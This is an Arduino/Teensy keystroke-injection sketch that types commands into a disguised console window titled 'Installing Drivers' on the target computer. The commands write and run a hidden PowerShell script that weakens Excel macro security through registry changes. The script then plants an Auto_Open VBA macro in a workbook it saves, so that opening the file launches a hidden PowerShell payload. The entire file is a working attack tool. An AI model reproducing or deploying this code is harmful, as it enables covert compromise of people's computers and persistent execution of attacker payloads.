#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $exl = New-Object -ComObject Excel.Application > %temp%\\dexl.ps1");
  Keyboard.println("echo $Pld = \"powershell.exe -WindowStyle hidden -ep bypass -nologo -noprofile -c INPUT0 \" >> %temp%\\dexl.ps1");
  Keyboard.println("echo $OFile = \"INPUT1\" >> %temp%\\dexl.ps1");
  Keyboard.println("echo $exlV = $exl.Version >> %temp%\\dexl.ps1");
  Keyboard.println("echo if (($exlV -eq \"12.0\") -or  ($exlV -eq \"11.0\")){ >> %temp%\\dexl.ps1");
  Keyboard.println("echo $exl.DisplayAlerts = $False} >> %temp%\\dexl.ps1");
  Keyboard.println("echo else {$exl.DisplayAlerts = \"wdAlertsNone\"} >> %temp%\\dexl.ps1");
  Keyboard.println("echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$exlV\\excel\\Security\" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dexl.ps1");
  Keyboard.println("echo New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\$exlV\\excel\\Security\" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force ^| Out-Null >> %temp%\\dexl.ps1");
  Keyboard.println("echo $ce = @^\" >> %temp%\\dexl.ps1");
  Keyboard.println("echo Sub Auto_Open() >> %temp%\\dexl.ps1");
  Keyboard.println("echo Execute >> %temp%\\dexl.ps1");
  Keyboard.println("echo End Sub >> %temp%\\dexl.ps1");
  Keyboard.println("echo Public Function Execute() As Variant >> %temp%\\dexl.ps1");
  Keyboard.println("echo Const HIDDEN_WINDOW = 0 >> %temp%\\dexl.ps1");
  Keyboard.println("echo strComputer = \".\" >> %temp%\\dexl.ps1");
  Keyboard.println("echo Set objWMIService = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2\") >> %temp%\\dexl.ps1");
  Keyboard.println("echo Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\") >> %temp%\\dexl.ps1");
  Keyboard.println("echo Set objConfig = objStartup.SpawnInstance_ >> %temp%\\dexl.ps1");
  Keyboard.println("echo objConfig.ShowWindow = HIDDEN_WINDOW >> %temp%\\dexl.ps1");
  Keyboard.println("echo Set objProcess = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2:Win32_Process\") >> %temp%\\dexl.ps1");
  Keyboard.println("echo objProcess.Create \"$Pld\", Null, objConfig, intProcessID >> %temp%\\dexl.ps1");
  Keyboard.println("echo End Function >> %temp%\\dexl.ps1");
  Keyboard.println("echo ^\"@ >> %temp%\\dexl.ps1");
  Keyboard.println("echo $Wbk = $exl.Workbooks.Add(1) >> %temp%\\dexl.ps1");
  Keyboard.println("echo $Wst=$Wbk.WorkSheets.item(1) >> %temp%\\dexl.ps1");
  Keyboard.println("echo $ExlM = $Wbk.VBProject.VBComponents.Add(1) >> %temp%\\dexl.ps1");
  Keyboard.println("echo $ExlM.CodeModule.AddFromString($ce) >> %temp%\\dexl.ps1");
  Keyboard.println("echo $Wbk.SaveAs($OFile, 18) >> %temp%\\dexl.ps1");
  Keyboard.println("echo $exl.WorkBooks.Close() >> %temp%\\dexl.ps1");
  Keyboard.println("echo $exl.quit() >> %temp%\\dexl.ps1");
  Keyboard.println("echo [System.Runtime.Interopservices.Marshal]::ReleaseComObject($exl) >> %temp%\\dexl.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dexl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dexl.ps1\"),0,true >> %temp%\\dexl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dexl.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS